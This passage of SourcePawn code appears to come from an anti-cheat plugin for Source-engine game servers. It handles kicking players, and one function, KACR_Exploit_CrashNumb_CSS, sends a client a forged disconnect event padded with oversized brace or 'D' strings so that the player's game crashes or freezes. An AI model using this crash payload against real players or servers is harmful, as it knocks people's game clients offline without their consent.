	hData.ReadString(cReason, sizeof(cReason));
	view_as<float>(iClient) = hData.ReadFloat();
	hData.Close();
	
	if(g_bConnected[iClient])
	{
		if(KickClient(iClient, "%s", cReason))
			KACR_Log(false, "[Warning] Failed to crash Client '%L', he was kicked instead", iClient);
			// TODO: Report back #27
			
		else
			KACR_Log(false, "[Error] Failed to kick Client '%L', after crashing him before dident worked too! Report this Error to get it fixed", iClient);
			// TODO: Report back #27
	}
	
	else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger // TODO, BUG: Does the 1 Frame Delay will cause problems with our disconnect Functions?
		OnClientDisconnect(iClient); // Needed, will be executed in the main File
		
	// BUG:TODO: Both Handles arent closed yet!!!
}

Action KACR_Exploit_CrashNumb_CSS(Handle hTimer, DataPack hData)
{
	// Original Code by Reg1oxeN
	
	char cReason[256];
	int iClient;
	
	hData.ReadString(cReason, sizeof(cReason));
	view_as<float>(iClient) = hData.ReadFloat();
	bool bNumb = hData.ReadCell(); // Make Numb instead of Crash
	hData.Close();
	
	Event hEvent = CreateEvent("player_disconnect", true);
	hEvent.SetString("name", "Unconnected");
	hEvent.SetInt("index", 0);
	hEvent.SetInt("userid", 0);
	hEvent.SetString("networkid", "STEAM_0:0:1337");
	
	if (!bNumb)
		hEvent.SetString("reason", "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ?{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
		
	else
		hEvent.SetString("reason", "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ? DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ?DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");
	
	hEvent.FireToClient(iClient);
	hEvent.Cancel();
}

/*
* Sends an Message to an Admin on Steam
* You should check 'g_bASteambot' and 'ASteambot_IsConnected' before calling this
* Use \n for splitting Messages with 1,3s Delay between the Parts (usefull to prevent getting blocked from Steam when spamming Stuff)
* 
* @param cText		Message to send (Max 900 Chars).
* @param ...		Variable number of format parameters.
*/
KACR_PrintToSteamAdmins(const char[] cText, any ...)
{
	char[] cAdmin = "STEAM_ID_PENDING"; // Targeted Steam Admin AuthId_Steam2.
	
	char cBuffer[256], cFormat[256];
	VFormat(cBuffer, sizeof(cBuffer), cText, 3);
	Format(cFormat, sizeof(cFormat), "%s/%s", cAdmin, cBuffer); // TODO: Let the User Configure multiply Steam Users in one Var
	ASteambot_SendMessage(AS_SIMPLE, cFormat);
}
